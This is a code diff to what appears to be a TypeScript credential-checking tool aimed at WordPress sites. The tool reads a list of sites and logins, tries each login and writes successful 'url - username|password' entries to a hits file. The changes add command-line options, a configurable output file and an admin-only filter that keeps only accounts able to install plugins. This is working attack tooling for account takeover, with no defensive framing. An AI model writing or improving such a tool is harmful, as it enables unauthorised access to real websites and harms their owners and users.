@@ -7,14 +7,31 @@ import colors from 'colors';
 import { banner } from './constant/banner';
 import { IWordpress, LogEntry } from './interfaces/wp.interfaces';
 import blessed from 'blessed';
+import yargs from 'yargs/yargs';
+import { hideBin } from 'yargs/helpers';
 
-const filename: string = process.argv[2];
-const debugMode: boolean = process.argv.includes('--debug');
+const argv = yargs(hideBin(process.argv))
+    .option('admin-only', {
+        type: 'boolean',
+        description: 'Check only admin users'
+    })
+    .option('output', {
+        type: 'string',
+        description: 'Output file for results',
+        default: 'hits.txt'
+    })
+    .option('debug', {
+        type: 'boolean',
+        description: 'Enable debug mode'
+    })
+    .demandCommand(1, 'You need to provide a filename')
+    .help()
+    .argv;
 
-if (!filename) {
-    console.log('Usage: node main.js <list.txt> [--debug]');
-    process.exit(1);
-}
+const filename: string = argv._[0] as string;
+const adminOnly: boolean = argv['admin-only'];
+const outputFile: string = argv.output;
+const debugMode: boolean = argv.debug;
 
 const screen = blessed.screen({
     smartCSR: true,
@@ -65,7 +82,7 @@ class Wordpress implements IWordpress {
         this.hits = 0;
         this.bad = 0;
         this.cpm = 0;
-        this.result = fs.createWriteStream('hits.txt', { flags: 'a+' });
+        this.result = fs.createWriteStream(outputFile, { flags: 'a+' });
         this.start = Date.now();
         this.logBuffer = [];
         this.client = wrapper(axios.create({ jar: new CookieJar() }));
@@ -160,7 +177,13 @@ class Wordpress implements IWordpress {
                     console.log('Final response data:', r.data);
                 }
 
-                if (r.data.includes('dashicons-admin-plugins') || r.data.includes('wp-admin-bar')) {
+                let isAdmin = true;
+
+                if (adminOnly) {
+                    isAdmin = r.data.includes("plugin-install.php");
+                }
+
+                if (isAdmin && (r.data.includes('dashicons-admin-plugins') || r.data.includes('wp-admin-bar'))) {
                     this.hits += 1;
                     if (this.result.writable) {
                         this.result.write(`${url} - ${username}|${password}\n`);
